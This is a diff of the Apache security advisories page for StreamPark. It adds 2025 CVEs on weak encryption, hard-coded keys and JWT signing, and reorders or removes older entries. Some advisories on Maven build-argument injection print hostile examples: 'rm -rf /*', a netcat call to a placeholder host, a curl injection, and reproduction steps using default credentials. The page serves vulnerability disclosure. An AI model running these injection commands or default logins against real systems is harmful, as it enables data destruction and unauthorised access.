@@ -105,124 +105,144 @@
 <p>Do you want disclose a potential security issue for Apache StreamPark? You can read more about the projects&rsquo; security policy on their <a href="https://streampark.apache.org/community/security/">security page</a>, and email your report to the <a href="mailto:security@apache.org">Apache Security Team</a>.</p>
 <h1 id="advisories">Advisories</h1>
 <p class="bg-warning">This section is experimental: it provides advisories since 2023 and may lag behind the official CVE publications. It may also lack details found on the <a href="https://streampark.apache.org/community/security/">project security page</a>. If you have any feedback on how you would like this data to be provided, you are welcome to reach out on our public <a href="/mailinglist">mailinglist</a> or privately on <a href="mailto:security@apache.org">security@apache.org</a></p>
-<h2 id="CVE-2022-45801">LDAP Injection Vulnerability</h2>
-<p>CVE-2022-45801 <a href="./CVE-2022-45801.cve.json">[CVE json]</a> <a href="./CVE-2022-45801.osv.json">[OSV json]</a></p>
-<p><em>Last updated: 2023-05-01T14:50:06.013Z</em></p>
+<h2 id="CVE-2025-54981">Weak Encryption Algorithm in StreamPark</h2>
+<p>CVE-2025-54981 <a href="https://cve.org/CVERecord?id=CVE-2025-54981">[CVE]</a> <a href="./CVE-2025-54981.cve.json">[CVE json]</a> <a href="./CVE-2025-54981.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2025-12-12T15:10:32.960Z</em></p>
 <h3 id="affected">Affected</h3>
 <ul>
-<li>Apache StreamPark (incubating) from 1.0.0 before 2.0.0</li>
+<li>Apache StreamPark from 2.0.0 before 2.1.7</li>
 </ul>
 <h3 id="description">Description</h3>
-<div><div><span style="background-color: rgb(255, 255, 255);">Apache StreamPark 1.0.0 to 2.0.0 have a LDAP injection vulnerability.</span><br><span style="background-color: rgb(255, 255, 255);">LDAP Injection is an attack used to exploit web based applications</span><br><span style="background-color: rgb(255, 255, 255);">that construct LDAP statements based on user input. When an</span><br><span style="background-color: rgb(255, 255, 255);">application fails to properly sanitize user input, it's possible to</span><br><span style="background-color: rgb(255, 255, 255);">modify LDAP statements through techniques similar to SQL Injection.</span><br><span style="background-color: rgb(255, 255, 255);">LDAP injection attacks could result in the granting of permissions to</span><br><span style="background-color: rgb(255, 255, 255);">unauthorized queries, and content modification inside the LDAP tree.</span><br><span style="background-color: rgb(255, 255, 255);">This risk may only occur when the user logs in with ldap, and the user</span><br><span style="background-color: rgb(255, 255, 255);">name and password login will not be affected, Users of the affected</span><br><span style="background-color: rgb(255, 255, 255);">versions should upgrade to Apache StreamPark 2.0.0 or later.</span><br><br></div></div><br>
+<p><span style="background-color: rgb(255, 255, 255);">Weak Encryption Algorithm in StreamPark,&nbsp;The use of an AES cipher in ECB mode and a weak random number generator for encrypting sensitive data, including JWT tokens, may have risked exposing sensitive authentication data<br></span><br>This issue affects Apache StreamPark: from 2.0.0 before 2.1.7.</p><p>Users are recommended to upgrade to version 2.1.7, which fixes the issue.</p>
 <h3 id="references">References</h3>
 <ul>
-<li><a href="https://lists.apache.org/thread/xbkwwpkp3n2rs2wcxg8l26mhsftxwwr9">https://lists.apache.org/thread/xbkwwpkp3n2rs2wcxg8l26mhsftxwwr9</a></li>
-</ul>
-<h2 id="CVE-2022-45802">Upload any file to any directory</h2>
-<p>CVE-2022-45802 <a href="./CVE-2022-45802.cve.json">[CVE json]</a> <a href="./CVE-2022-45802.osv.json">[OSV json]</a></p>
-<p><em>Last updated: 2023-06-26T10:23:44.595Z</em></p>
-<h3 id="affected-1">Affected</h3>
-<ul>
-<li>Apache StreamPark (incubating) from 1.0.0 before 2.0.0</li>
-</ul>
-<h3 id="description-1">Description</h3>
-<div><div><span style="background-color: var(--wht);">Streampark allows any users to upload a jar as application, but there is no mandatory verification of the uploaded file type, causing users to upload some high-risk files, and may upload them to any directory,&nbsp;</span><span style="background-color: var(--wht);">Users of the affected versions should upgrade to Apache StreamPark 2.0.0 or later</span></div><br></div><br><br>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://lists.apache.org/thread/thwl1v2h6r3c21x1qwff08o57qzjnst6">https://lists.apache.org/thread/thwl1v2h6r3c21x1qwff08o57qzjnst6</a></li>
-</ul>
-<h2 id="CVE-2022-46365">Logic error causing any account reset</h2>
-<p>CVE-2022-46365 <a href="./CVE-2022-46365.cve.json">[CVE json]</a> <a href="./CVE-2022-46365.osv.json">[OSV json]</a></p>
-<p><em>Last updated: 2023-05-01T14:53:47.030Z</em></p>
-<h3 id="affected-2">Affected</h3>
-<ul>
-<li>Apache StreamPark (incubating) from 1.0.0 before 2.0.0</li>
-</ul>
-<h3 id="description-2">Description</h3>
-<p><span style="background-color: rgb(255, 255, 255);"><span style="background-color: rgb(255, 255, 255);"><div><div>Apache StreamPark 1.0.0 <span style="background-color: rgb(255, 255, 255);">before</span> 2.0.0 When the user successfully logs in, to modify his profile, the username will be passed to the server-layer as a parameter, but not verified whether the user name is the currently logged user and whether the user is legal, This will allow malicious attackers to send any username to modify and reset the account, <span style="background-color: rgb(255, 255, 255);">Users of the affected </span><span style="background-color: rgb(255, 255, 255);">versions should upgrade to Apache StreamPark 2.0.0 or later.</span></div></div></span></span><br></p>
-<h3 id="references-2">References</h3>
-<ul>
-<li><a href="https://lists.apache.org/thread/f68lcwrp8pcdc4yrbpcm8j7m0f5mjn7h">https://lists.apache.org/thread/f68lcwrp8pcdc4yrbpcm8j7m0f5mjn7h</a></li>
-</ul>
-<h2 id="CVE-2023-30867">Authenticated system users could trigger SQL injection vulnerability</h2>
-<p>CVE-2023-30867 <a href="./CVE-2023-30867.cve.json">[CVE json]</a> <a href="./CVE-2023-30867.osv.json">[OSV json]</a></p>
-<p><em>Last updated: 2023-12-15T12:13:59.544Z</em></p>
-<h3 id="affected-3">Affected</h3>
-<ul>
-<li>Apache StreamPark (incubating) from 2.0.0 before 2.1.2</li>
-</ul>
-<h3 id="description-3">Description</h3>
-<div><span style="background-color: var(--wht);">In the Streampark platform, when users log in to the system and use certain features, some pages provide a name-based fuzzy search, such as job names, role names, etc. The sql syntax :select * from table where jobName like '%jobName%'. However, the jobName field may receive illegal parameters, leading to SQL injection. This could potentially result in information leakage.</span><div><span style="background-color: var(--wht);"><br></span></div><br><div>Mitigation:</div><div><br></div><span style="background-color: rgb(255, 255, 255);">Users are recommended to upgrade to version 2.1.2, which fixes the issue.</span><br><br></div><br><p></p>
-<h3 id="references-3">References</h3>
-<ul>
-<li><a href="https://lists.apache.org/thread/bhdzh6hnh04yyf3g203bbyvxryd720o2">https://lists.apache.org/thread/bhdzh6hnh04yyf3g203bbyvxryd720o2</a></li>
-</ul>
-<h2 id="CVE-2023-49898">Authenticated system users could trigger remote command execution</h2>
-<p>CVE-2023-49898 <a href="./CVE-2023-49898.cve.json">[CVE json]</a> <a href="./CVE-2023-49898.osv.json">[OSV json]</a></p>
-<p><em>Last updated: 2023-12-15T12:13:22.953Z</em></p>
-<h3 id="affected-4">Affected</h3>
-<ul>
-<li>Apache StreamPark (incubating) from 2.0.0 before 2.1.2</li>
-</ul>
-<h3 id="description-4">Description</h3>
-<div>In streampark, there is a project module that integrates Maven's compilation capability. However, there is no check on the compilation parameters of Maven. allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.<br><br><div>Mitigation:<br><br></div>all users&nbsp;<span style="background-color: var(--wht);">should upgrade to 2.1.2</span><div><br></div><br><div>Example:<br><br><div><p></p><div>##You can customize the splicing method according to the compilation situation of the project, mvn compilation results use &amp;&amp;, compilation failure use "||" or "&amp;&amp;":<br><br><span style="background-color: var(--wht);">/usr/share/java/maven-3/conf/settings.xml || rm -rf /*</span><br></div><p></p></div></div><div><div>/usr/share/java/maven-3/conf/settings.xml &amp;&amp; nohup nc x.x.x.x 8899 &amp;</div><br></div></div><p></p>
-<h3 id="references-4">References</h3>
-<ul>
-<li><a href="https://lists.apache.org/thread/qj99c03r4td35f8gbxq084b8qmv2fyr3">https://lists.apache.org/thread/qj99c03r4td35f8gbxq084b8qmv2fyr3</a></li>
-</ul>
-<h2 id="CVE-2023-52290">Unchecked SQL query fields trigger SQL injection vulnerability</h2>
-<p>CVE-2023-52290 <a href="./CVE-2023-52290.cve.json">[CVE json]</a> <a href="./CVE-2023-52290.osv.json">[OSV json]</a></p>
-<p><em>Last updated: 2024-07-16T07:37:36.828Z</em></p>
-<h3 id="affected-5">Affected</h3>
-<ul>
-<li>Apache StreamPark (incubating) from 2.0.0 before 2.1.4</li>
-</ul>
-<h3 id="description-5">Description</h3>
-<p><br>In streampark-console the list pages(e.g: application pages), users can sort page by field. This sort field is sent from the front-end to the back-end, and the SQL query is generated using this field. However, because this sort field isn&rsquo;t validated, there is a risk of SQL injection vulnerability. The attacker must successfully log into the system to launch an attack, which may cause data leakage. Since no data will be written, <span style="background-color: rgb(255, 255, 255);">so this is a low-impact vulnerability.</span><br><br><div><div>Mitigation:<br><br>all users should upgrade to 2.1.4,  Such parameters will be blocked.<br><br></div></div><br><br></p>
-<h3 id="references-5">References</h3>
-<ul>
-<li><a href="https://lists.apache.org/thread/t3mcm8pb65d9gj3wrgtj9sx9s2pfvvl3">https://lists.apache.org/thread/t3mcm8pb65d9gj3wrgtj9sx9s2pfvvl3</a></li>
+<li><a href="https://lists.apache.org/thread/9rbvdvwg5fdhzjdgyrholgso53r26998">https://lists.apache.org/thread/9rbvdvwg5fdhzjdgyrholgso53r26998</a></li>
 </ul>
 <h3 id="credits">Credits</h3>
 <ul>
-<li>thiscodecc of MoyunSec Vlab and Bing (reporter)</li>
+<li>omkar parkhe <a href="mailto:omkarparth@gmail.com">omkarparth@gmail.com</a> (finder)</li>
 </ul>
-<h2 id="CVE-2023-52291">Unchecked maven build params could trigger remote command execution</h2>
-<p>CVE-2023-52291 <a href="./CVE-2023-52291.cve.json">[CVE json]</a> <a href="./CVE-2023-52291.osv.json">[OSV json]</a></p>
-<p><em>Last updated: 2024-07-17T08:16:10.844Z</em></p>
+<h2 id="CVE-2025-54947">Use hard-coded key vulnerability</h2>
+<p>CVE-2025-54947 <a href="https://cve.org/CVERecord?id=CVE-2025-54947">[CVE]</a> <a href="./CVE-2025-54947.cve.json">[CVE json]</a> <a href="./CVE-2025-54947.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2025-12-12T15:11:36.470Z</em></p>
+<h3 id="affected-1">Affected</h3>
+<ul>
+<li>Apache StreamPark from 2.0.0 before 2.1.7</li>
+</ul>
+<h3 id="description-1">Description</h3>
+<p>In Apache StreamPark versions 2.0.0 through 2.1.7, a security vulnerability involving a hard-coded encryption key exists. This vulnerability occurs because the system uses a fixed, immutable key for encryption instead of dynamically generating or securely configuring the key. Attackers may obtain this key through reverse engineering or code analysis, potentially decrypting sensitive data or forging encrypted information, leading to information disclosure or unauthorized system access.</p><p>This issue affects Apache StreamPark: from 2.0.0 before 2.1.7.</p><p>Users are recommended to upgrade to version 2.1.7, which fixes the issue.</p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://lists.apache.org/thread/kdntmzyzrco75x9q6mc6s8lty1fxmog1">https://lists.apache.org/thread/kdntmzyzrco75x9q6mc6s8lty1fxmog1</a></li>
+</ul>
+<h3 id="credits-1">Credits</h3>
+<ul>
+<li><a href="mailto:omkarparth@gmail.com">omkarparth@gmail.com</a> (finder)</li>
+</ul>
+<h2 id="CVE-2025-53960">Uses the user’s password as the secret key</h2>
+<p>CVE-2025-53960 <a href="https://cve.org/CVERecord?id=CVE-2025-53960">[CVE]</a> <a href="./CVE-2025-53960.cve.json">[CVE json]</a> <a href="./CVE-2025-53960.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2025-12-16T10:08:35.119Z</em></p>
+<h3 id="affected-2">Affected</h3>
+<ul>
+<li>Apache StreamPark from 2.0.0 before 2.1.7</li>
+</ul>
+<h3 id="description-2">Description</h3>
+<p></p><div><div><p>When issuing JSON Web Tokens (JWT), Apache StreamPark directly uses the user's password as the HMAC signing key (e.g., with the HS256 algorithm). An attacker can exploit this vulnerability to perform offline brute-force attacks on the user's password using a captured JWT, or to arbitrarily forge identity tokens for the user if the password is already known, ultimately leading to complete account takeover.<br><br></p></div></div>This issue affects Apache StreamPark: from 2.0.0 before 2.1.7.<p></p><p>Users are recommended to upgrade to version 2.1.7, which fixes the issue.</p>
+<h3 id="references-2">References</h3>
+<ul>
+<li><a href="https://lists.apache.org/thread/xlpvfzf5l5m5mfyjwrz5h4dssm3c32vy">https://lists.apache.org/thread/xlpvfzf5l5m5mfyjwrz5h4dssm3c32vy</a></li>
+</ul>
+<h3 id="credits-2">Credits</h3>
+<ul>
+<li>omkar parkhe <a href="mailto:omkarparth@gmail.com">omkarparth@gmail.com</a> (finder)</li>
+</ul>
+<h2 id="CVE-2025-30001">Authenticated users can trigger remote command execution</h2>
+<p>CVE-2025-30001 <a href="https://cve.org/CVERecord?id=CVE-2025-30001">[CVE]</a> <a href="./CVE-2025-30001.cve.json">[CVE json]</a> <a href="./CVE-2025-30001.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2025-10-10T09:52:24.458Z</em></p>
+<h3 id="affected-3">Affected</h3>
+<ul>
+<li>Apache StreamPark from 2.1.4 before 2.1.6</li>
+</ul>
+<h3 id="description-3">Description</h3>
+<p>Incorrect Execution-Assigned Permissions vulnerability in Apache StreamPark.</p><p>This issue affects Apache StreamPark: from 2.1.4 before 2.1.6.</p><p>Users are recommended to upgrade to version 2.1.6, which fixes the issue.</p>
+<h3 id="references-3">References</h3>
+<ul>
+<li><a href="https://lists.apache.org/thread/xfmsvhkcnr1831n0w5ovy3p44lsmfb7m">https://lists.apache.org/thread/xfmsvhkcnr1831n0w5ovy3p44lsmfb7m</a></li>
+</ul>
+<h3 id="credits-3">Credits</h3>
+<ul>
+<li>Liufeng Yi (<a href="mailto:ylf@yiliufeng.net">ylf@yiliufeng.net</a>) (reporter)</li>
+</ul>
+<h2 id="CVE-2024-48988">SQL injection vulnerability</h2>
+<p>CVE-2024-48988 <a href="https://cve.org/CVERecord?id=CVE-2024-48988">[CVE]</a> <a href="./CVE-2024-48988.cve.json">[CVE json]</a> <a href="./CVE-2024-48988.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2025-08-22T16:18:41.486Z</em></p>
+<h3 id="affected-4">Affected</h3>
+<ul>
+<li>Apache StreamPark from 2.1.4 before 2.1.6</li>
+</ul>
+<h3 id="description-4">Description</h3>
+<p>SQL Injection vulnerability in Apache StreamPark.</p><p>This issue affects Apache StreamPark: from 2.1.4 before 2.1.6.</p><p>Users are recommended to upgrade to version 2.1.6, which fixes the issue.</p><br>This vulnerability is present only in the distribution package (SpringBoot platform) and does not involve Maven artifacts.<br>It can only be exploited after a user has successfully logged into the platform (implying that the attacker would first need to compromise the login authentication). <br>As a result, the associated risk is considered relatively low.<br><p><br></p>
+<h3 id="references-4">References</h3>
+<ul>
+<li><a href="https://lists.apache.org/thread/26ng8388l93zwjrst560cbjz9x7wpq1s">https://lists.apache.org/thread/26ng8388l93zwjrst560cbjz9x7wpq1s</a></li>
+</ul>
+<h3 id="credits-4">Credits</h3>
+<ul>
+<li>Xingchen Chen, Ze Jin, wh1t3p1g, yhbl, Qixu Liu  Institute of Information Engineering, CAS (reporter)</li>
+</ul>
+<h2 id="CVE-2024-34457">Apache StreamPark IDOR Vulnerability</h2>
+<p>CVE-2024-34457 <a href="https://cve.org/CVERecord?id=CVE-2024-34457">[CVE]</a> <a href="./CVE-2024-34457.cve.json">[CVE json]</a> <a href="./CVE-2024-34457.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2024-09-11T11:03:06.370Z</em></p>
+<h3 id="affected-5">Affected</h3>
+<ul>
+<li>Apache StreamPark from 1.0.0 before 2.1.4</li>
+</ul>
+<h3 id="description-5">Description</h3>
+<div>On versions before 2.1.4, after a regular user successfully logs in, they can manually make a request using the authorization token to view everyone's user flink information, including executeSQL and config.<br></div><br><div>Mitigation:<br><br></div>all users <span style="background-color: var(--wht);">should upgrade to 2.1.4</span><br><br><br><br>
+<h3 id="references-5">References</h3>
+<ul>
+<li><a href="https://lists.apache.org/thread/brlfrmvw9dcv38zoofmhxg7qookmwn7j">https://lists.apache.org/thread/brlfrmvw9dcv38zoofmhxg7qookmwn7j</a></li>
+</ul>
+<h3 id="credits-5">Credits</h3>
+<ul>
+<li>L0ne1y (reporter)</li>
+</ul>
+<h2 id="CVE-2024-29737">maven build params could trigger remote command execution</h2>
+<p>CVE-2024-29737 <a href="https://cve.org/CVERecord?id=CVE-2024-29737">[CVE]</a> <a href="./CVE-2024-29737.cve.json">[CVE json]</a> <a href="./CVE-2024-29737.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2024-07-17T08:21:09.036Z</em></p>
 <h3 id="affected-6">Affected</h3>
 <ul>
 <li>Apache StreamPark (incubating) from 2.0.0 before 2.1.4</li>
 </ul>
 <h3 id="description-6">Description</h3>
-<p>In streampark, the project module integrates Maven&rsquo;s compilation capabilities. The input parameter validation is not strict, allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.<br><div><br><br>Background:<br><br>In the &ldquo;Project&rdquo; module, the maven build args <span style="background-color: rgb(255, 255, 255);"> “&lt;” operator causes command injection. e.g</span> : “&lt; (curl <a target="_blank" rel="nofollow" href="http://xxx.com"><a href="http://xxx.com">http://xxx.com</a></a>)” will be executed as a command injection,<br><br><br><div>Mitigation:<br><br></div>all users <span style="background-color: var(--wht);">should upgrade to 2.1.4,  The &ldquo;&lt;&rdquo; operator will blocked。</span><div><br></div></div><p></p><br><br></p>
+<p>In streampark, the project module integrates Maven&rsquo;s compilation capabilities. The input parameter validation is not strict, allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.<br><div><br><div>Mitigation:<br><br></div>all users <span style="background-color: var(--wht);">should upgrade to 2.1.4<br><br>Background info:<span style="background-color: rgb(255, 255, 255);"><br><span style="background-color: rgb(255, 255, 255);"><br>Log in to Streampark using the default username (e.g. test1, test2, test3) and the default password (streampark). Navigate to the Project module, then add a new project. Enter the git repository address of the project and input <code>touch /tmp/success_2.1.2</code> as the &ldquo;Build Argument&rdquo;. Note that there is no verification and interception of the special character &ldquo;<code>&quot;. As a result, you will find that this injection command will be successfully executed after executing the build.&lt;br&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;div&gt;In the latest version, the special symbol </code> is intercepted.</div><div><div><div><div></div></div></div></div></span><div><br><br></div></div><p></p><br></p>
 <h3 id="references-6">References</h3>
 <ul>
-<li><a href="https://lists.apache.org/thread/pl6xgzoqrl4kcn0nt55zjbsx8dn80mkf">https://lists.apache.org/thread/pl6xgzoqrl4kcn0nt55zjbsx8dn80mkf</a></li>
+<li><a href="https://lists.apache.org/thread/xhx7jt1t24s6d7o435wxng8t0ojfbfh5">https://lists.apache.org/thread/xhx7jt1t24s6d7o435wxng8t0ojfbfh5</a></li>
 </ul>
-<h3 id="credits-1">Credits</h3>
+<h3 id="credits-6">Credits</h3>
 <ul>
-<li>thiscodecc of MoyunSec Vlab and Bing (finder)</li>
+<li>L0ne1y (reporter)</li>
 </ul>
-<h2 id="CVE-2024-29070">session not invalidated after logout</h2>
-<p>CVE-2024-29070 <a href="./CVE-2024-29070.cve.json">[CVE json]</a> <a href="./CVE-2024-29070.osv.json">[OSV json]</a></p>
-<p><em>Last updated: 2025-02-06T14:33:02.169Z</em></p>
+<h2 id="CVE-2024-29178">FreeMarker SSTI RCE Vulnerability</h2>
+<p>CVE-2024-29178 <a href="https://cve.org/CVERecord?id=CVE-2024-29178">[CVE]</a> <a href="./CVE-2024-29178.cve.json">[CVE json]</a> <a href="./CVE-2024-29178.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2024-07-18T11:15:55.181Z</em></p>
 <h3 id="affected-7">Affected</h3>
 <ul>
 <li>Apache StreamPark from 1.0.0 before 2.1.4</li>
 </ul>
 <h3 id="description-7">Description</h3>
-<p>On versions before 2.1.4, session is not invalidated after logout. When the user logged in successfully, the Backend service returns &ldquo;Authorization&rdquo; as the front-end authentication credential. &ldquo;Authorization&rdquo; can still initiate requests and access data even after logout.<br><br><div>Mitigation:<br><br></div>all users <span style="background-color: var(--wht);">should upgrade to 2.1.4</span><br><br><br></p>
+<p><span style="background-color: rgb(255, 255, 255);">On versions before 2.1.4, a user could log in and perform a template injection attack resulting in Remote Code Execution on the server, The attacker must successfully log into the system to launch an attack, so this is a moderate-impact vulnerability.<br></span><br><br><div>Mitigation:<br><br></div>all users <span style="background-color: var(--wht);">should upgrade to 2.1.4</span><br><br></p>
 <h3 id="references-7">References</h3>
 <ul>
-<li><a href="https://lists.apache.org/thread/zslblrz1l0n9t67mqdv42yv75ncfn9zl">https://lists.apache.org/thread/zslblrz1l0n9t67mqdv42yv75ncfn9zl</a></li>
+<li><a href="https://lists.apache.org/thread/n6dhnl68knpxy80t35qxkkw2691l8sfn">https://lists.apache.org/thread/n6dhnl68knpxy80t35qxkkw2691l8sfn</a></li>
 </ul>
-<h3 id="credits-2">Credits</h3>
+<h3 id="credits-7">Credits</h3>
 <ul>
 <li>L0ne1y (reporter)</li>
 </ul>
 <h2 id="CVE-2024-29120">Information leakage vulnerability</h2>
-<p>CVE-2024-29120 <a href="./CVE-2024-29120.cve.json">[CVE json]</a> <a href="./CVE-2024-29120.osv.json">[OSV json]</a></p>
+<p>CVE-2024-29120 <a href="https://cve.org/CVERecord?id=CVE-2024-29120">[CVE]</a> <a href="./CVE-2024-29120.cve.json">[CVE json]</a> <a href="./CVE-2024-29120.osv.json">[OSV json]</a></p>
 <p><em>Last updated: 2024-07-17T14:59:02.804Z</em></p>
 <h3 id="affected-8">Affected</h3>
 <ul>
@@ -234,145 +254,125 @@
 <ul>
 <li><a href="https://lists.apache.org/thread/y3oqz7l8vd7jxxx3z2khgl625nvfr60j">https://lists.apache.org/thread/y3oqz7l8vd7jxxx3z2khgl625nvfr60j</a></li>
 </ul>
-<h3 id="credits-3">Credits</h3>
+<h3 id="credits-8">Credits</h3>
 <ul>
 <li>L0ne1y (reporter)</li>
 </ul>
-<h2 id="CVE-2024-29178">FreeMarker SSTI RCE Vulnerability</h2>
-<p>CVE-2024-29178 <a href="./CVE-2024-29178.cve.json">[CVE json]</a> <a href="./CVE-2024-29178.osv.json">[OSV json]</a></p>
-<p><em>Last updated: 2024-07-18T11:15:55.181Z</em></p>
+<h2 id="CVE-2024-29070">session not invalidated after logout</h2>
+<p>CVE-2024-29070 <a href="https://cve.org/CVERecord?id=CVE-2024-29070">[CVE]</a> <a href="./CVE-2024-29070.cve.json">[CVE json]</a> <a href="./CVE-2024-29070.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2025-02-06T14:33:02.169Z</em></p>
 <h3 id="affected-9">Affected</h3>
 <ul>
 <li>Apache StreamPark from 1.0.0 before 2.1.4</li>
 </ul>
 <h3 id="description-9">Description</h3>
-<p><span style="background-color: rgb(255, 255, 255);">On versions before 2.1.4, a user could log in and perform a template injection attack resulting in Remote Code Execution on the server, The attacker must successfully log into the system to launch an attack, so this is a moderate-impact vulnerability.<br></span><br><br><div>Mitigation:<br><br></div>all users <span style="background-color: var(--wht);">should upgrade to 2.1.4</span><br><br></p>
+<p>On versions before 2.1.4, session is not invalidated after logout. When the user logged in successfully, the Backend service returns &ldquo;Authorization&rdquo; as the front-end authentication credential. &ldquo;Authorization&rdquo; can still initiate requests and access data even after logout.<br><br><div>Mitigation:<br><br></div>all users <span style="background-color: var(--wht);">should upgrade to 2.1.4</span><br><br><br></p>
 <h3 id="references-9">References</h3>
 <ul>
-<li><a href="https://lists.apache.org/thread/n6dhnl68knpxy80t35qxkkw2691l8sfn">https://lists.apache.org/thread/n6dhnl68knpxy80t35qxkkw2691l8sfn</a></li>
+<li><a href="https://lists.apache.org/thread/zslblrz1l0n9t67mqdv42yv75ncfn9zl">https://lists.apache.org/thread/zslblrz1l0n9t67mqdv42yv75ncfn9zl</a></li>
 </ul>
-<h3 id="credits-4">Credits</h3>
+<h3 id="credits-9">Credits</h3>
 <ul>
 <li>L0ne1y (reporter)</li>
 </ul>
-<h2 id="CVE-2024-29737">maven build params could trigger remote command execution</h2>
-<p>CVE-2024-29737 <a href="./CVE-2024-29737.cve.json">[CVE json]</a> <a href="./CVE-2024-29737.osv.json">[OSV json]</a></p>
-<p><em>Last updated: 2024-07-17T08:21:09.036Z</em></p>
+<h2 id="CVE-2023-52291">Unchecked maven build params could trigger remote command execution</h2>
+<p>CVE-2023-52291 <a href="https://cve.org/CVERecord?id=CVE-2023-52291">[CVE]</a> <a href="./CVE-2023-52291.cve.json">[CVE json]</a> <a href="./CVE-2023-52291.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2024-07-17T08:16:10.844Z</em></p>
 <h3 id="affected-10">Affected</h3>
 <ul>
 <li>Apache StreamPark (incubating) from 2.0.0 before 2.1.4</li>
 </ul>
 <h3 id="description-10">Description</h3>
-<p>In streampark, the project module integrates Maven&rsquo;s compilation capabilities. The input parameter validation is not strict, allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.<br><div><br><div>Mitigation:<br><br></div>all users <span style="background-color: var(--wht);">should upgrade to 2.1.4<br><br>Background info:<span style="background-color: rgb(255, 255, 255);"><br><span style="background-color: rgb(255, 255, 255);"><br>Log in to Streampark using the default username (e.g. test1, test2, test3) and the default password (streampark). Navigate to the Project module, then add a new project. Enter the git repository address of the project and input <code>touch /tmp/success_2.1.2</code> as the &ldquo;Build Argument&rdquo;. Note that there is no verification and interception of the special character &ldquo;<code>&quot;. As a result, you will find that this injection command will be successfully executed after executing the build.&lt;br&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;div&gt;In the latest version, the special symbol </code> is intercepted.</div><div><div><div><div></div></div></div></div></span><div><br><br></div></div><p></p><br></p>
+<p>In streampark, the project module integrates Maven&rsquo;s compilation capabilities. The input parameter validation is not strict, allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.<br><div><br><br>Background:<br><br>In the &ldquo;Project&rdquo; module, the maven build args <span style="background-color: rgb(255, 255, 255);"> “&lt;” operator causes command injection. e.g</span> : “&lt; (curl <a target="_blank" rel="nofollow" href="http://xxx.com"><a href="http://xxx.com">http://xxx.com</a></a>)” will be executed as a command injection,<br><br><br><div>Mitigation:<br><br></div>all users <span style="background-color: var(--wht);">should upgrade to 2.1.4,  The &ldquo;&lt;&rdquo; operator will blocked。</span><div><br></div></div><p></p><br><br></p>
 <h3 id="references-10">References</h3>
 <ul>
-<li><a href="https://lists.apache.org/thread/xhx7jt1t24s6d7o435wxng8t0ojfbfh5">https://lists.apache.org/thread/xhx7jt1t24s6d7o435wxng8t0ojfbfh5</a></li>
-</ul>
-<h3 id="credits-5">Credits</h3>
-<ul>
-<li>L0ne1y (reporter)</li>
-</ul>
-<h2 id="CVE-2024-34457">Apache StreamPark IDOR Vulnerability</h2>
-<p>CVE-2024-34457 <a href="./CVE-2024-34457.cve.json">[CVE json]</a> <a href="./CVE-2024-34457.osv.json">[OSV json]</a></p>
-<p><em>Last updated: 2024-09-11T11:03:06.370Z</em></p>
-<h3 id="affected-11">Affected</h3>
-<ul>
-<li>Apache StreamPark from 1.0.0 before 2.1.4</li>
-</ul>
-<h3 id="description-11">Description</h3>
-<div>On versions before 2.1.4, after a regular user successfully logs in, they can manually make a request using the authorization token to view everyone's user flink information, including executeSQL and config.<br></div><br><div>Mitigation:<br><br></div>all users <span style="background-color: var(--wht);">should upgrade to 2.1.4</span><br><br><br><br>
-<h3 id="references-11">References</h3>
-<ul>
-<li><a href="https://lists.apache.org/thread/brlfrmvw9dcv38zoofmhxg7qookmwn7j">https://lists.apache.org/thread/brlfrmvw9dcv38zoofmhxg7qookmwn7j</a></li>
-</ul>
-<h3 id="credits-6">Credits</h3>
-<ul>
-<li>L0ne1y (reporter)</li>
-</ul>
-<h2 id="CVE-2024-48988">SQL injection vulnerability</h2>
-<p>CVE-2024-48988 <a href="./CVE-2024-48988.cve.json">[CVE json]</a> <a href="./CVE-2024-48988.osv.json">[OSV json]</a></p>
-<p><em>Last updated: 2025-08-22T16:18:41.486Z</em></p>
-<h3 id="affected-12">Affected</h3>
-<ul>
-<li>Apache StreamPark from 2.1.4 before 2.1.6</li>
-</ul>
-<h3 id="description-12">Description</h3>
-<p>SQL Injection vulnerability in Apache StreamPark.</p><p>This issue affects Apache StreamPark: from 2.1.4 before 2.1.6.</p><p>Users are recommended to upgrade to version 2.1.6, which fixes the issue.</p><br>This vulnerability is present only in the distribution package (SpringBoot platform) and does not involve Maven artifacts.<br>It can only be exploited after a user has successfully logged into the platform (implying that the attacker would first need to compromise the login authentication). <br>As a result, the associated risk is considered relatively low.<br><p><br></p>
-<h3 id="references-12">References</h3>
-<ul>
-<li><a href="https://lists.apache.org/thread/26ng8388l93zwjrst560cbjz9x7wpq1s">https://lists.apache.org/thread/26ng8388l93zwjrst560cbjz9x7wpq1s</a></li>
-</ul>
-<h3 id="credits-7">Credits</h3>
-<ul>
-<li>Xingchen Chen, Ze Jin, wh1t3p1g, yhbl, Qixu Liu  Institute of Information Engineering, CAS (reporter)</li>
-</ul>
